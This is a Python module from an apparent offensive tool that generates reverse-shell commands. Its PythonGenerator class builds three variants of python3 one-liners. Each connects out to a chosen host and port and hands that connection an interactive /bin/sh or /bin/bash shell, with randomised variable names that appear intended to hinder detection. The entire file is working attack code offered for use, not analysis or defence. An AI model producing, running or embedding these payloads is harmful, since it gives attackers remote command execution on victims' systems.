import random
from .base import RandomNamePool, ShellGenerator, ShellResult

_VARIANTS = ["socket_exec", "socket_subprocess", "pty"]


class PythonGenerator(ShellGenerator):
    language = "python3"

    def _generate(self, lhost: str, lport: int, arch: str, names: RandomNamePool | None) -> ShellResult:
        variant = random.choice(_VARIANTS)

        if variant == "socket_exec":
            cmd = self._socket_exec(lhost, lport, names)
        elif variant == "socket_subprocess":
            cmd = self._socket_subprocess(lhost, lport, names)
        else:
            cmd = self._pty_variant(lhost, lport, names)

        return ShellResult(command=cmd, variant=variant, language=self.language, arch=arch)

    def _socket_exec(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        return (
            f'python3 -c \'import socket,subprocess,os;'
            f'{s}=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            f'{s}.connect(("{lhost}",{lport}));'
            f'os.dup2({s}.fileno(),0);os.dup2({s}.fileno(),1);'
            f'os.dup2({s}.fileno(),2);'
            f'subprocess.call(["/bin/sh","-i"])\''
        )

    def _socket_subprocess(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        p = self._var("p", names)
        return (
            f'python3 -c \'import socket,subprocess;'
            f'{s}=socket.socket();'
            f'{s}.connect(("{lhost}",{lport}));'
            f'{p}=subprocess.Popen(["/bin/sh"],stdin={s},stdout={s},stderr={s});'
            f'{p}.wait()\''
        )

    def _pty_variant(self, lhost: str, lport: int, names: RandomNamePool | None) -> str:
        s = self._var("s", names)
        return (
            f'python3 -c \'import pty,socket,os;'
            f'{s}=socket.socket();'
            f'{s}.connect(("{lhost}",{lport}));'
            f'os.dup2({s}.fileno(),0);os.dup2({s}.fileno(),1);os.dup2({s}.fileno(),2);'
            f'pty.spawn("/bin/bash")\''
        )
